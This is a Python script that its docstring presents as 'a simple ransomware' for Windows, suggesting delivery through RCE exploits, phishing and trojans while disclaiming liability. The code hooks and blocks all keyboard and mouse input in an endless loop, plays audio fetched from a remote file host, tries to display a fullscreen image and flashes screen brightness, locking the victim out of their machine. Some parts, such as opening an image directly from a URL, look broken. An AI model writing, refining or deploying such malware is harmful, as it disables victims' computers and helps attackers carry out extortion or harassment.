"""

This is a simple ransomware wich will display a image on the victims PC and disable their input. 
It's written in python and dependancies need to be installed prior.


    Good usage cases include but are not limited to:

    RCE exploits
    Phishing
    Trojan attacks

PLEASE use this responsibly, I claim no legal fault for any misuse of this program.

    btw, this script will not work on all systems, it's lightly tested on Windows.




Love, -LadySec

""" 

import sys
import tkinter
from PIL import Image, ImageTk
from threading import Timer, Thread
from time import sleep
from playsound import playsound  

import pyHook
import win32gui
import logging
import win32file

import screen_brightness_control as sbc

def FULL_BRIGHT():
    current_brightness = sbc.get_brightness()
    if current_brightness == 100:
        pass
    else:
        sbc.set_brightness(100)

def brightness_setter(num, sleep_time):
    sbc.set_brightness(num)
    sleep(sleep_time)

def FLASHER(num):
    for i in range(num):
        brightness_setter(0, 0.5)
        brightness_setter(100, 0.5)

def showPIL(pilImage):
    root = tkinter.Tk()
    w, h = root.winfo_screenwidth(), root.winfo_screenheight()
    root.overrideredirect(1)
    root.geometry("%dx%d+0+0" % (w, h))
    root.focus_set()
    canvas = tkinter.Canvas(root, width=w, height=h)
    canvas.pack()
    canvas.configure(background='black')
    imgWidth, imgHeight = pilImage.size
    if imgWidth > w or imgHeight > h:
        ratio = min(w / imgWidth, h / imgHeight)
        imgWidth = int(imgWidth * ratio)
        imgHeight = int(imgHeight * ratio)
        pilImage = pilImage.resize((imgWidth, imgHeight), Image.ANTIALIAS)
    image = ImageTk.PhotoImage(pilImage)
    canvas.create_image(w / 2, h / 2, image=image)
    root.mainloop()

class blockInput:

    def __init__(self):
        self.hm = pyHook.HookManager()

    def OnKeyboardEvent(self, event):
        return False

    def OnMouseEvent(self, event):
        return False

    def unblock(self):
        try:
            self.hm.UnhookKeyboard()
        except:
            pass
        try:
            self.hm.UnhookMouse()
        except:
            pass

    def block(self, keyboard=True, mouse=True):
        while True:
            if mouse:
                self.hm.MouseAll = self.OnMouseEvent
                self.hm.HookMouse()
            if keyboard:
                self.hm.KeyAll = self.OnKeyboardEvent
                self.hm.HookKeyboard()
            win32gui.PumpWaitingMessages()

def play_audio():
    while True:
        playsound("https://files.catbox.moe/17mf2x.mp3")

def main():
    audio_thread = Thread(target=play_audio, daemon=True)
    audio_thread.start()

    block = blockInput()
    block.block()
    block.unblock()

    pilImage = Image.open("https://files.catbox.moe/owrdv6.webp")
    showPIL(pilImage)

    FULL_BRIGHT()
    FLASHER(3)

while True:
    main()
